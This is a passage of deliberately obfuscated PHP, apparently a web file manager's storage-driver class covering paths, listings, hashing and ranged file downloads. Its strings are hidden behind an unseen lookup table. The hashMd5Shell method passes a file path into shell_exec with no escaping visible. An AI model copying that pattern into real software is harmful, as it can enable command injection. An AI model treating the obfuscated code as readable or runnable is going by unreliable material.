$ïÜûîÒç, $•˜–İŞ¬); } else { $ÏÜç‚áò = @iconv($•˜–İŞ¬, $ïÜûîÒç, $Á¬Àâá); } $ÏÜç‚áò = $ÏÜç‚áò ? $ÏÜç‚áò : $Á¬Àâá; if (strstr($ÏÜç‚áò, $Ê¹à‰É…[76])) { $ÏÜç‚áò = str_replace($Ê¹à‰É…[76], $Ê¹à‰É…[11], $ÏÜç‚áò); } $õó„Å æ[$•˜–İŞ¬ . $Ê¹à‰É…[73] . $ïÜûîÒç . $Ê¹à‰É…[74] . $Á¬Àâá] = $ÏÜç‚áò; $õó„Å æ[$ïÜûîÒç . $Ê¹à‰É…[73] . $•˜–İŞ¬ . $Ê¹à‰É…[74] . $Á¬Àâá] = $Á¬Àâá; $õó„Å æ[$ïÜûîÒç . $Ê¹à‰É…[73] . $•˜–İŞ¬ . $Ê¹à‰É…[74] . $ÏÜç‚áò] = $Á¬Àâá; $õó„Å æ[$•˜–İŞ¬ . $Ê¹à‰É…[73] . $ïÜûîÒç . $Ê¹à‰É…[74] . $ÏÜç‚áò] = $ÏÜç‚áò; return $ÏÜç‚áò; } public function getPathInner($ò’Ò³”ğ) { $µÍ²Éˆò = IO::init($ò’Ò³”ğ); return $µÍ²Éˆò->path; } public function getPathOuter($¶¤ùÆ†ğ) { $ş±ï±İş =& $_SERVER[‹è™Ü¸Ñ]; $…î†à–ï = strlen(trim($this->pathBase, $ş±ï±İş[8])); $¶¤ùÆ†ğ = substr(trim($¶¤ùÆ†ğ, $ş±ï±İş[8]), $…î†à–ï); return $this->pathDriver . $ş±ï±İş[8] . ltrim($¶¤ùÆ†ğ, $ş±ï±İş[8]); } public function isParentOf($Ïú¢±Ò˜, $ÒãºİâÚ) { $»Š™ÌŒ =& $_SERVER[‹è™Ü¸Ñ]; $Ïú¢±Ò˜ = rtrim(strtolower($Ïú¢±Ò˜), $»Š™ÌŒ[8]) . $»Š™ÌŒ[8]; $ÒãºİâÚ = rtrim(strtolower($ÒãºİâÚ), $»Š™ÌŒ[8]) . $»Š™ÌŒ[8]; $…“íÉæ‘ = strpos($ÒãºİâÚ, $Ïú¢±Ò˜) === 0; return $…“íÉæ‘; } public function getType() { $ç¤ñ¨–¥ =& $_SERVER[‹è™Ü¸Ñ]; $µ£©÷ì­ = str_replace($ç¤ñ¨–¥[77], $ç¤ñ¨–¥[12], get_class($this)); return strtolower($µ£©÷ì­); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¾“Ä„Ùé, $ùô‹ÏŸò) { $ª¶›š¯ê =& $_SERVER[‹è™Ü¸Ñ]; $Êø÷Ç¶½ = rtrim($¾“Ä„Ùé, $ª¶›š¯ê[8]) . $ª¶›š¯ê[8] . $ùô‹ÏŸò; $â§ÂåÂ = $this->exist($Êø÷Ç¶½); return $â§ÂåÂ ? $Êø÷Ç¶½ : !1; } public function setModifyTime($²û«ã…ï, $¸Ì¿„¶Ú = '') { } public function renameObject($›£§©, $üßöªôŒ) { $¬–ü“­ = $üßöªôŒ; $›£§© = $this->getPathOuter($›£§©); $üßöªôŒ = $this->pathFather($›£§©) . $üßöªôŒ; $ªÕëÏÕ© = IO::copy($›£§©, $this->pathFather($›£§©), REPEAT_RENAME_FOLDER, $¬–ü“­); if ($ªÕëÏÕ©) { IO::remove($›£§©); } return $ªÕëÏÕ© ? $üßöªôŒ : !1; } public function tempFile($ø¡×ßì… = '', $Ğô›“Å¦ = '') { if (!$ø¡×ßì…) { $ø¡×ßì… = rand_string(15); } $ïØ†–¦Î = TEMP_FILES . rand_string(15) . $_SERVER[‹è™Ü¸Ñ][8]; @mkdir($ïØ†–¦Î, DEFAULT_PERRMISSIONS, !0); $õúõ¸µ° = $ïØ†–¦Î . $ø¡×ßì…; @touch($õúõ¸µ°); if ($Ğô›“Å¦) { file_put_contents($õúõ¸µ°, $Ğô›“Å¦); } return $õúõ¸µ°; } public function tempFileRemve($âİîı¤ô) { @unlink($âİîı¤ô); @rmdir($this->pathFather($âİîı¤ô)); } public function mkfile($ì’‚Šçê, $ºù»şŠé = '', $Ñ›»©ïÒ = REPEAT_RENAME) { } public function mkdir($˜À¨òÇ¾, $ğ²—à¹ = REPEAT_SKIP) { } public function delFile($ğ³…Ûä—) { } public function delFolder($ÓÔªÆ€Ë) { } public function copyFile($ÂûÒ«ÖÏ, $ÎäÙè÷¨) { } public function moveFile($Ô½Ò®¨, $‹Åµ±Æƒ) { } public function remove($”Œæ°‹) { if ($this->isFile($”Œæ°‹)) { return $this->delFile($”Œæ°‹); } return $this->delFolder($”Œæ°‹); } public function rename($…ÁÏæäç, $÷÷ë¢·) { } public function exist($Ì–ÛÉ’Ç) { } public function findByHash($Áƒµ…ƒò = '', $÷‘Š‰Ş¨ = '') { return !1; } public function isFile($„˜ÈÑ²) { } public function isFolder($£§¸¶Ÿ) { } public function size($’Úİ‚¸) { } public function info($¨ìšá»Ö) { } public function infoSimple($ºÀÅÁ”¤) { return $this->info($ºÀÅÁ”¤); } public function infoAuth($îˆ÷¸‰Î) { return $this->info($îˆ÷¸‰Î); } public function infoFull($˜«Í˜İğ) { return $this->info($˜«Í˜İğ); } public function infoFullSimple($§¶‡óÖ) { return $this->info($§¶‡óÖ); } public function infoWithChildren($š¸÷Ó¤) { $Ã±¥¨Âş =& $_SERVER[‹è™Ü¸Ñ]; static $ ÛØµšÁ = array(); if (isset($ ÛØµšÁ[$š¸÷Ó¤])) { return $ ÛØµšÁ[$š¸÷Ó¤]; } $Øıä” = $this->info($š¸÷Ó¤); if ($Øıä” && $Øıä”[$Ã±¥¨Âş[33]] == $Ã±¥¨Âş[78]) { $—´‹‚®Á = array($Ã±¥¨Âş[79] => 0, $Ã±¥¨Âş[80] => 0, $Ã±¥¨Âş[81] => 0); $this->infoChildren($š¸÷Ó¤, $—´‹‚®Á); $Øıä”[$Ã±¥¨Âş[79]] = $—´‹‚®Á[$Ã±¥¨Âş[79]]; $Øıä”[$Ã±¥¨Âş[82]] = array($Ã±¥¨Âş[83] => $—´‹‚®Á[$Ã±¥¨Âş[80]], $Ã±¥¨Âş[84] => $—´‹‚®Á[$Ã±¥¨Âş[81]]); $ ÛØµšÁ[$š¸÷Ó¤] = $Øıä”; } return $Øıä”; } public function listPath($È»ñëÄ¦, $à€Ş¡ş” = false) { } public function has($£ÀœšĞ¹, $½ã²Æ±ã = false, $ÆÏ²É¹Ì = false) { } public function canRead($ı‡™è‡) { } public function canWrite($ÍÚ½Ã) { } public function getContent($êú–±„§) { } public function setContent($êº–À«¿, $›…ÖÍç = '') { } protected function infoChildren($õ²½²ëø, &$È£ö´Üº) { $Ä­èè–˜ =& $_SERVER[‹è™Ü¸Ñ]; check_abort_echo(); $ƒÕ£ÉËÃ = $this->listPath($õ²½²ëø, !0); $ƒÕ£ÉËÃ = array_merge($ƒÕ£ÉËÃ[$Ä­èè–˜[85]], $ƒÕ£ÉËÃ[$Ä­èè–˜[86]]); foreach ($ƒÕ£ÉËÃ as $Ïåıİã®) { if ($Ïåıİã®[$Ä­èè–˜[33]] == $Ä­èè–˜[78]) { $È£ö´Üº[$Ä­èè–˜[81]]++; $ß˜Øú›Á = $this->getPathInner($Ïåıİã®[$Ä­èè–˜[87]]); $this->infoChildren($ß˜Øú›Á, $È£ö´Üº); } else { $È£ö´Üº[$Ä­èè–˜[80]]++; $È£ö´Üº[$Ä­èè–˜[79]] += $Ïåıİã®[$Ä­èè–˜[79]]; } } } public function fileSubstr($œìóä³Ş, $¬¯ñüã, $¯ğ„Õ÷Í) { } public function listAll($ öÔÇı) { } public function listAllMake($±×ı¦, &$¨òœª¢) { $ùº¾ˆ…  =& $_SERVER[‹è™Ü¸Ñ]; check_abort_echo(); $ø¯ĞÏä² = $this->listPath($±×ı¦, !0); if (!$ø¯ĞÏä²) { return; } $Û•¡ƒİ = array_merge($ø¯ĞÏä²[$ùº¾ˆ… [85]], $ø¯ĞÏä²[$ùº¾ˆ… [86]]); foreach ($Û•¡ƒİ as $˜Ìå¸Û) { $¯¢ó¬ø¨ = $˜Ìå¸Û[$ùº¾ˆ… [33]] == $ùº¾ˆ… [78]; $Œí®õõî = array($ùº¾ˆ… [87] => $˜Ìå¸Û[$ùº¾ˆ… [87]], $ùº¾ˆ… [78] => $¯¢ó¬ø¨); if (isset($˜Ìå¸Û[$ùº¾ˆ… [79]])) { $Œí®õõî[$ùº¾ˆ… [79]] = $˜Ìå¸Û[$ùº¾ˆ… [79]]; } if (isset($˜Ìå¸Û[$ùº¾ˆ… [88]])) { $Œí®õõî[$ùº¾ˆ… [88]] = $˜Ìå¸Û[$ùº¾ˆ… [88]]; } if (!$¯¢ó¬ø¨) { $¨òœª¢[] = $Œí®õõî; continue; } $¨òœª¢[] = $Œí®õõî; $ÑÌÂŒÎ  = $˜Ìå¸Û[$ùº¾ˆ… [87]]; $Ğ±¡„¿Å = $this->pathDriver; if (substr($˜Ìå¸Û[$ùº¾ˆ… [87]], 0, strlen($Ğ±¡„¿Å)) == $Ğ±¡„¿Å) { $ÑÌÂŒÎ  = substr($ÑÌÂŒÎ , strlen($Ğ±¡„¿Å)); } $this->listAllMake($ÑÌÂŒÎ , $¨òœª¢); } } public function listAllSimple($Ğ²»ù÷ı, $ ‹îû¢ = false) { $ˆñ¾ŞšÉ = $this->listAll($Ğ²»ù÷ı); return $this->listAllSimpleMake($ˆñ¾ŞšÉ, $this->getPathOuter($Ğ²»ù÷ı), $ ‹îû¢); } public function listAllSimpleMake($º‘Å, $¢Ê¤…æ, $Ë®ºÃå¶) { $Í²Ú®Ğ† =& $_SERVER[‹è™Ü¸Ñ]; $¥ø¥¨ƒÎ = array(); $¢Ê¤…æ = rtrim(get_path_father($¢Ê¤…æ), $Í²Ú®Ğ†[8]) . $Í²Ú®Ğ†[8]; foreach ($º‘Å as $£úİ€§) { $Ï˜§‘ = array($Í²Ú®Ğ†[87] => $£úİ€§[$Í²Ú®Ğ†[87]], $Í²Ú®Ğ†[89] => $£úİ€§[$Í²Ú®Ğ†[87]], $Í²Ú®Ğ†[78] => $£úİ€§[$Í²Ú®Ğ†[78]]); if (isset($£úİ€§[$Í²Ú®Ğ†[79]]) && !$£úİ€§[$Í²Ú®Ğ†[78]]) { $Ï˜§‘[$Í²Ú®Ğ†[79]] = $£úİ€§[$Í²Ú®Ğ†[79]]; } if (isset($£úİ€§[$Í²Ú®Ğ†[88]])) { $Ï˜§‘[$Í²Ú®Ğ†[88]] = $£úİ€§[$Í²Ú®Ğ†[88]]; } if (is_array($£úİ€§[$Í²Ú®Ğ†[90]])) { $Ï˜§‘[$Í²Ú®Ğ†[89]] = $£úİ€§[$Í²Ú®Ğ†[90]][$Í²Ú®Ğ†[87]]; $Ï˜§‘[$Í²Ú®Ğ†[79]] = $£úİ€§[$Í²Ú®Ğ†[90]][$Í²Ú®Ğ†[79]]; $Ï˜§‘[$Í²Ú®Ğ†[88]] = $£úİ€§[$Í²Ú®Ğ†[90]][$Í²Ú®Ğ†[88]]; } else { if (substr($£úİ€§[$Í²Ú®Ğ†[87]], 0, strlen($¢Ê¤…æ)) == $¢Ê¤…æ) { $Ï˜§‘[$Í²Ú®Ğ†[87]] = substr($£úİ€§[$Í²Ú®Ğ†[87]], strlen($¢Ê¤…æ)); } } $ºé±çü = $£úİ€§[$Í²Ú®Ğ†[78]] ? $Í²Ú®Ğ†[8] : $Í²Ú®Ğ†[12]; $Ï˜§‘[$Í²Ú®Ğ†[89]] = rtrim($Ï˜§‘[$Í²Ú®Ğ†[89]], $Í²Ú®Ğ†[8]) . $ºé±çü; $Ï˜§‘[$Í²Ú®Ğ†[87]] = $Í²Ú®Ğ†[8] . trim($Ï˜§‘[$Í²Ú®Ğ†[87]], $Í²Ú®Ğ†[8]) . $ºé±çü; if (!$Ë®ºÃå¶) { $ï–ğæŒë = explode($Í²Ú®Ğ†[8], trim($Ï˜§‘[$Í²Ú®Ğ†[87]], $Í²Ú®Ğ†[8])); $Ï˜§‘[$Í²Ú®Ğ†[87]] = $Í²Ú®Ğ†[8] . implode($Í²Ú®Ğ†[8], array_slice($ï–ğæŒë, 1)) . $ºé±çü; } $¥ø¥¨ƒÎ[] = $Ï˜§‘; } return array_sort_by($¥ø¥¨ƒÎ, $Í²Ú®Ğ†[87]); } public function upload($ÔÕ˜è‡‚, $ä¦¾×Ø§, $ŠÀúÔâ† = false, $€ô«øö¾ = REPEAT_REPLACE) { } public function uploadFileByID($”Íëü©ì, $ ñßÕšë, $¤ÍËªö) { } public function uploadFileByPath($Âõôâ•Ç, $â¦³Ô©Œ, $ íòÌêË = array()) { } public function isUploadServer() { $’±Ìêğ± =& $_SERVER[‹è™Ü¸Ñ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $’±Ìêğ±[91]) { return !0; } return $GLOBALS[$’±Ìêğ±[6]][$’±Ìêğ±[92]][$’±Ìêğ±[93]]; } public function isFileOutServer() { $™úáÎ¾¿ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $™úáÎ¾¿[91]) { return !0; } return $GLOBALS[$™úáÎ¾¿[6]][$™úáÎ¾¿[92]][$™úáÎ¾¿[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Å†”üºÆ) { $á…²É­‚ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->isCdnHost()) { return $Å†”üºÆ; } return str_replace(trim(get_url_root($Å†”üºÆ), $á…²É­‚[8]), trim($this->cdnHost, $á…²É­‚[8]), $Å†”üºÆ); } public function uploadLink($€ûæÌ‘Â, $±¢Ú·¦á = 0) { $£²Âúë =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isUploadServer()) { return; } $×¸µë¼‡ = $this->getType(); if (!in_array($×¸µë¼‡, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÆôàÈ‹¤ = 1024 * 1024 * 10; $º˜Ÿ€×‡ = $±¢Ú·¦á <= $ÆôàÈ‹¤ ? $£²Âúë[95] : $£²Âúë[96]; $€šø™¹Ø = (!$±¢Ú·¦á ? 1 : ceil($±¢Ú·¦á / pow(1024, 3))) * 3600 * 4; $š¸ıŠ“ = $this->{$º˜Ÿ€×‡}($€ûæÌ‘Â, $€šø™¹Ø); if ($š¸ıŠ“) { $š¸ıŠ“[$£²Âúë[97]] = $€ûæÌ‘Â; $š¸ıŠ“[$£²Âúë[98]] = $×¸µë¼‡; } return $š¸ıŠ“; } public function uploadFormData($Ë€À†Ñî, $£˜ò…Å¢ = 3600) { } public function multiUploadFormData($¥©¦ë»›, $İöÑ  = 3600) { } public function download($ØÖ¬ƒ¦´, $Ù­÷ªş÷) { } public function ext($şâ¬Œ„ı) { $†¾–¤´ =& $_SERVER[‹è™Ü¸Ñ]; if (strpos($şâ¬Œ„ı, $†¾–¤´[8]) === -1) { $ö¥Ñ½ = $şâ¬Œ„ı; } else { $ö¥Ñ½ = $this->pathThis($şâ¬Œ„ı); } $§ïÆóâï = $†¾–¤´[12]; if (strstr($ö¥Ñ½, $†¾–¤´[10])) { $§ïÆóâï = substr($ö¥Ñ½, strrpos($ö¥Ñ½, $†¾–¤´[10]) + 1); $§ïÆóâï = strtolower($§ïÆóâï); } if (strlen($§ïÆóâï) > 3 && preg_match($†¾–¤´[99], $§ïÆóâï, $äÜ±…áó)) { $§ïÆóâï = $†¾–¤´[12]; } return $§ïÆóâï; } public function pathThis($ÙÊÔöú‚) { $È¾Ää¦® =& $_SERVER[‹è™Ü¸Ñ]; $ÙÊÔöú‚ = str_replace($È¾Ää¦®[100], $È¾Ää¦®[8], rtrim($ÙÊÔöú‚, $È¾Ää¦®[8])); $›°£‚‹À = strrpos($ÙÊÔöú‚, $È¾Ää¦®[8]); if ($›°£‚‹À === !1) { return $ÙÊÔöú‚; } return substr($ÙÊÔöú‚, $›°£‚‹À + 1); } public function pathFather($˜ÆâŸÍ») { $¡èŞ½¶Ó =& $_SERVER[‹è™Ü¸Ñ]; $˜ÆâŸÍ» = str_replace($¡èŞ½¶Ó[100], $¡èŞ½¶Ó[8], rtrim($˜ÆâŸÍ», $¡èŞ½¶Ó[8])); $Š¤Ù—ìÂ = strrpos($˜ÆâŸÍ», $¡èŞ½¶Ó[8]); if ($Š¤Ù—ìÂ === !1) { return $¡èŞ½¶Ó[12]; } return substr($˜ÆâŸÍ», 0, $Š¤Ù—ìÂ + 1); } public function hashSimple($·©Èïùâ) { $–½Æö¾» =& $_SERVER[‹è™Ü¸Ñ]; if (!$·©Èïùâ) { return md5($–½Æö¾»[12]); } $¨¢Ì—í = $this->size($·©Èïùâ); $ò„ö¸‹ï = 200; $×Á™¦¢« = 50; if ($¨¢Ì—í <= $ò„ö¸‹ï * $×Á™¦¢«) { return $this->hashMd5($·©Èïùâ) . $¨¢Ì—í; } $§õ€ª¿‡ = intval($¨¢Ì—í / $×Á™¦¢«); $âÉî– = $–½Æö¾»[12]; for ($”Å°‡™ğ = 0; $”Å°‡™ğ < $×Á™¦¢«; $”Å°‡™ğ++) { $âÉî– .= $this->fileSubstr($·©Èïùâ, $§õ€ª¿‡ * $”Å°‡™ğ, $ò„ö¸‹ï); } $âÉî– .= $this->fileSubstr($·©Èïùâ, $¨¢Ì—í - $ò„ö¸‹ï, $ò„ö¸‹ï); return md5($âÉî–) . $¨¢Ì—í; } public static $md5Cache = array(); public function hashMd5($ßì³‘‰) { if (!$ßì³‘‰) { return md5($_SERVER[‹è™Ü¸Ñ][12]); } $ßì³‘‰ = $this->iconvSystem($ßì³‘‰); if (isset(self::$md5Cache[$ßì³‘‰])) { return self::$md5Cache[$ßì³‘‰]; } self::$md5Cache[$ßì³‘‰] = $this->hashMd5Shell($ßì³‘‰); if (!self::$md5Cache[$ßì³‘‰]) { self::$md5Cache[$ßì³‘‰] = @md5_file($ßì³‘‰); } return self::$md5Cache[$ßì³‘‰]; } private function hashMd5Shell($î´»®ôª) { $™íÄ¾†ø =& $_SERVER[‹è™Ü¸Ñ]; if (!$î´»®ôª) { return md5($™íÄ¾†ø[12]); } if (!function_exists($™íÄ¾†ø[101])) { return !1; } $ÂŠ¦°ÊÔ = array($™íÄ¾†ø[102], $™íÄ¾†ø[103]); $õÖû¾‘² = Cache::get($™íÄ¾†ø[104]); if (!$õÖû¾‘²) { $ğÛø¨™Å = BASIC_PATH . $™íÄ¾†ø[105]; $ÄÕìÅïœ = md5_file($ğÛø¨™Å); $õÖû¾‘² = $™íÄ¾†ø[106]; foreach ($ÂŠ¦°ÊÔ as $Úí³«ŒÓ) { $ñøˆ•€ã = shell_exec($Úí³«ŒÓ . "\x20\42{$ğÛø¨™Å}\x22"); if ($ñøˆ•€ã && substr(trim($ñøˆ•€ã), 0, 32) == $ÄÕìÅïœ) { $õÖû¾‘² = $Úí³«ŒÓ; break; } } Cache::set($™íÄ¾†ø[104], $õÖû¾‘², 3600); } if ($õÖû¾‘² == $™íÄ¾†ø[106]) { return !1; } $ñøˆ•€ã = shell_exec($õÖû¾‘² . "\x20\x22{$î´»®ôª}\42"); $ñøˆ•€ã = str_replace($™íÄ¾†ø[107], $™íÄ¾†ø[12], $ñøˆ•€ã); return substr($ñøˆ•€ã, 0, 32); } public function link($Ë¢º¢¸ñ) { return $Ë¢º¢¸ñ; } public function fileOut($„„ ²šÕ, $í÷¾Ãó = false, $ÊĞìíÕ¯ = false, $û«²ŠÇÍ = '') { $Ò–•èç =& $_SERVER[‹è™Ü¸Ñ]; $this->cacheMethod(null, null); if (!$„„ ²šÕ || !$this->exist($„„ ²šÕ)) { show_json(LNG($Ò–•èç[108]), !1, $ÊĞìíÕ¯); } $¯ãˆ‘Õ— = $this->getType() == $Ò–•èç[109]; $ƒáïñ£“ = $GLOBALS[$Ò–•èç[6]][$Ò–•èç[92]][$Ò–•èç[110]][$Ò–•èç[111]]; $­ªÈìÉß = (double) $GLOBALS[$Ò–•èç[6]][$Ò–•èç[92]][$Ò–•èç[110]][$Ò–•èç[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $˜ÎÒßó = $this->infoFull($„„ ²šÕ); $“‡ñú×Ô = $˜ÎÒßó[$Ò–•èç[79]]; $è†ú©œ’ = gmdate($Ò–•èç[113], $˜ÎÒßó[$Ò–•èç[88]]); $ª®öÒØ = $ÊĞìíÕ¯ ? $ÊĞìíÕ¯ : $this->iconvApp($˜ÎÒßó[$Ò–•èç[32]]); $ŠÜøÊ÷ = 0; $ßıİ™ù = $“‡ñú×Ô - 1; $›ßî’Õ÷ = $this->ext($ª®öÒØ); if (in_array($›ßî’Õ÷, array($Ò–•èç[114], $Ò–•èç[115], $Ò–•èç[116], $Ò–•èç[117]))) { $›ßî’Õ÷ = $Ò–•èç[118]; } if (in_array($›ßî’Õ÷, array($Ò–•èç[119]))) { $›ßî’Õ÷ = $Ò–•èç[120]; } if (!$û«²ŠÇÍ) { $û«²ŠÇÍ = md5($è†ú©œ’ . $“‡ñú×Ô); } $û«²ŠÇÍ = $Ò–•èç[121] . $û«²ŠÇÍ . $Ò–•èç[121]; $„‡çù‹Ñ = get_file_mime($›ßî’Õ÷); $ìÏ”Ûé© = !0; $ìÏ”Ûé© = isset($_GET[$Ò–•èç[122]]) ? !1 : !0; if ($í÷¾Ãó === !1 && !mime_support($„‡çù‹Ñ)) { $„‡çù‹Ñ = $Ò–•èç[123]; } header($Ò–•èç[124]); header($Ò–•èç[125] . $„‡çù‹Ñ); $„¯µê°± = rawurlencode($ª®öÒØ); $„¯µê°± = $Ò–•èç[121] . $„¯µê°± . $Ò–•èç[126] . $„¯µê°±; if ($í÷¾Ãó) { header($Ò–•èç[127]); header($Ò–•èç[128] . $„¯µê°±); } else { if ($ìÏ”Ûé©) { header($Ò–•èç[129] . $„¯µê°±); } } $·Û¦ıè = 3600 * 24 * 30; header($Ò–•èç[130]); header($Ò–•èç[131]); header($Ò–•èç[132] . $·Û¦ıè); header($Ò–•èç[133] . gmdate($Ò–•èç[113], time() + $·Û¦ıè) . $Ò–•èç[134]); if (isset($_SERVER[$Ò–•èç[135]]) && strtotime($_SERVER[$Ò–•èç[135]]) == $˜ÎÒßó[$Ò–•èç[88]]) { header($Ò–•èç[136], !0, 304); die; } if (isset($_SERVER[$Ò–•èç[137]]) && $_SERVER[$Ò–•èç[137]] == $û«²ŠÇÍ) { header($Ò–•èç[138] . $û«²ŠÇÍ, !0, 304); die; } header($Ò–•èç[138] . $û«²ŠÇÍ); header($Ò–•èç[139] . $è†ú©œ’ . $Ò–•èç[134]); header($Ò–•èç[140] . $ª®öÒØ); header($Ò–•èç[141]); header($Ò–•èç[142] . $“‡ñú×Ô); header($Ò–•èç[143]); Hook::trigger($Ò–•èç[144], $„„ ²šÕ, $“‡ñú×Ô, $ª®öÒØ, $›ßî’Õ÷); if (!$í÷¾Ãó && $›ßî’Õ÷ == $Ò–•èç[145]) { if ($“‡ñú×Ô > 1024 * 1024 * 5) { die; } $™ê¾–Ğø = $this->getContent($„„ ²šÕ); $™ê¾–Ğø = Html::clearSVG($™ê¾–Ğø); header($Ò–•èç[146] . strlen($™ê¾–Ğø)); echo $™ê¾–Ğø; die; } $—³°‘òÈ = strtolower($_SERVER[$Ò–•èç[147]]); if ($¯ãˆ‘Õ— && $—³°‘òÈ && $ƒáïñ£“) { if (strstr($—³°‘òÈ, $Ò–•èç[148])) { header($Ò–•èç[149] . $„„ ²šÕ); } else { if (strstr($—³°‘òÈ, $Ò–•èç[150])) { header($Ò–•èç[151] . $„„ ²šÕ); } else { if (strstr($—³°‘òÈ, $Ò–•èç[152])) { header($Ò–•èç[153] . $„„ ²šÕ); } } } if ($­ªÈìÉß) { header($Ò–•èç[154] . $­ªÈìÉß); } return; } if (isset($_SERVER[$Ò–•èç[155]])) { if (preg_match($Ò–•èç[156], $_SERVER[$Ò–•èç[155]], $œ•îÑËœ)) { $ŠÜøÊ÷ = intval($œ•îÑËœ[1]); $ŠÜøÊ÷ = $ŠÜøÊ÷ <= 0 ? 0 : ($ŠÜøÊ÷ >= $ßıİ™ù ? $ßıİ™ù : $ŠÜøÊ÷); if (!empty($œ•îÑËœ[2])) { $¡ü‹’±– = intval($œ•îÑËœ[2]); $ßıİ™ù = $¡ü‹’±– < $ŠÜøÊ÷ ? $ŠÜøÊ÷ : ($¡ü‹’±– >= $ßıİ™ù ? $ßıİ™ù : $¡ü‹’±–); } } header($Ò–•èç[157]); header("\x43\157\156\x74\145\156\164\x2d\x52\141\156\147\x65\x3a\40\142\x79\164\x65\163\40{$ŠÜøÊ÷}\x2d{$ßıİ™ù}\57" . $“‡ñú×Ô); } else { header($Ò–•èç[158]); } header($Ò–•èç[159]); header($Ò–•èç[160]); $ÓâûòÚ³ = !0; if ($_SERVER[$Ò–•èç[161]] == $Ò–•èç[162] && $“‡ñú×Ô > 1204 * 1024 * 1024 * 2) { $ÓâûòÚ³ = !1; } if ($ÓâûòÚ³) { header($Ò–•èç[163] . ($ßıİ™ù - $ŠÜøÊ÷ + 1)); } if ($_SERVER[$Ò–•èç[164]] == $Ò–•èç[165]) { return; } $ééÉğÍç = array($Ò–•èç[166] => !1, $Ò–•èç[167] => $ŠÜøÊ÷, $Ò–•èç[168] => $ßıİ™ù, $Ò–•èç[169] => $›ßî’Õ÷, $Ò–•èç[170] => $˜ÎÒßó, $Ò–•èç[171] => $Ò–•èç[12], $Ò–•èç[172] => 0); $ééÉğÍç = Hook::filter($Ò–•èç[173], $ééÉğÍç); $¦Ç˜á« = 1024 * 300; $”»“„¾ = 0; if ($­ªÈìÉß) { $”»“„¾ = intval(1000 * 1000 * ($¦Ç˜á« / $­ªÈìÉß)); } while ($ŠÜøÊ÷ <= $ßıİ™ù) { $°ğ÷Ğéö = timeFloat(); check_abort(); $ÎÉµˆè« = $ßıİ™ù - $ŠÜøÊ÷ + 1; if ($ÎÉµˆè« <= $¦Ç˜á«) { $¦Ç˜á« = $ÎÉµˆè«; } $™ê¾–Ğø = $this->fileSubstr($„„ ²šÕ, $ŠÜøÊ÷, $¦Ç˜á«); if ($ééÉğÍç[$Ò–•èç[166]]) { $ééÉğÍç[$Ò–•èç[171]] = $™ê¾–Ğø; $ééÉğÍç[$Ò–•èç[172]] = $ŠÜøÊ÷; $ééÉğÍç = Hook::filter($Ò–•èç[174], $ééÉğÍç); $™ê¾–Ğø = $ééÉğÍç[$Ò–•èç[171]]; } echo $™ê¾–Ğø; $ŠÜøÊ÷ += $¦Ç˜á«; if ($¦Ç˜á« == $ÎÉµˆè«) { $ŠÜøÊ÷ = $ßıİ™ù + 1; } if ($”»“„¾) { $¬ª–¼€ñ = intval(1000 * 1000 * (timeFloat() - $°ğ÷Ğéö)); $‹²è‹Ú¥ = $”»“„¾ - $¬ª–¼€ñ; if ($‹²è‹Ú¥ > 5) { usleep($‹²è‹Ú¥); } } } } public function fileOutServer($—ÁöÔ«½, $áĞÕ‘¨á = false, $›¶¬ú…„ = false, $ëè”–Öª = '') { $this->fileOut($—ÁöÔ«½, $áĞÕ‘¨á, $›¶¬ú…„, $ëè”–Öª); } public function fileOutLink($ğİË Ÿ) { header($_SERVER[‹è™Ü¸Ñ][175] . $ğİË Ÿ); die; } public function cacheMethod($ööÛâ€Ş, $ÀŒ»“æ, $’‘…ˆÆ = null) { $£×»—şê =& $_SERVER[‹è™Ü¸Ñ]; static $ºİ¸â = array(); $…‰üÙºµ = $ÀŒ»“æ ? ltrim($this->getPathOuter($ÀŒ»“æ), $£×»—şê[8]) : $£×»—şê[12]; $·¸à±–İ = $£×»—şê[176] . $ööÛâ€Ş . $£×»—şê[177] . rtrim($…‰üÙºµ, $£×»—şê[8]); if (is_null($ööÛâ€Ş)) { $ºİ¸â = array(); return; } if (is_null($ÀŒ»“æ)) { foreach ($ºİ¸â as $·¸à±–İ => $ÄÍ¹­´ò) { if (!strstr($·¸à±–İ, $£×»—şê[176] . $ööÛâ€Ş . $£×»—şê[178])) { continue; } unset($ºİ¸â[$·¸à±–İ]); } return; } if (!is_null($’‘…ˆÆ)) { $ºİ¸â[$·¸à±–İ] = $’‘…ˆÆ; return; } $Ÿ³´ŠİÜ = isset($ºİ¸â[$·¸à±–İ]) ? $ºİ¸â[$·¸à±–İ] : null; if (!is_null($Ÿ³´ŠİÜ)) { return $Ÿ³´ŠİÜ; } $Ÿ³´ŠİÜ = $this->{$ööÛâ€Ş}($ÀŒ»“æ); $ºİ¸â[$·¸à±–İ] = $Ÿ³´ŠİÜ; return $Ÿ³´ŠİÜ; } public function cacheMethodInfoSet($³²™Ö”, $ Ï¦«—, $©ÚÆ³„Ÿ = false) { $íÍšºêÕ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($íÍšºêÕ[179], $³²™Ö”, $ Ï¦«—); $this->cacheMethod($íÍšºêÕ[180], $³²™Ö”, $ Ï¦«— ? !1 : !0); if (is_array($©ÚÆ³„Ÿ)) { $this->cacheMethod($íÍšºêÕ[181], $³²™Ö”, $©ÚÆ³„Ÿ); } } public function fileOutImage($¼Ôş×ı, $–æ­œÆ“ = 250) { $÷¸Úüã½ =& $_SERVER[‹è™Ü¸Ñ]; set_timeout(); if (substr($¼Ôş×ı, 0, 4) == $÷¸Úüã½[152]) { $this->fileOutLink($¼Ôş×ı); } $‘ŠÖù– = $this->info($¼Ôş×ı); $­Ç÷ğˆ‘ = !1; $­­¤–ÑÊ = isset($GLOBALS[$÷¸Úüã½[182]]) ? $GLOBALS[$÷¸Úüã½[182]] : array(); if ($­­¤–ÑÊ && $­­¤–ÑÊ[$÷¸Úüã½[183]] == $‘ŠÖù–[$÷¸Úüã½[87]]) { 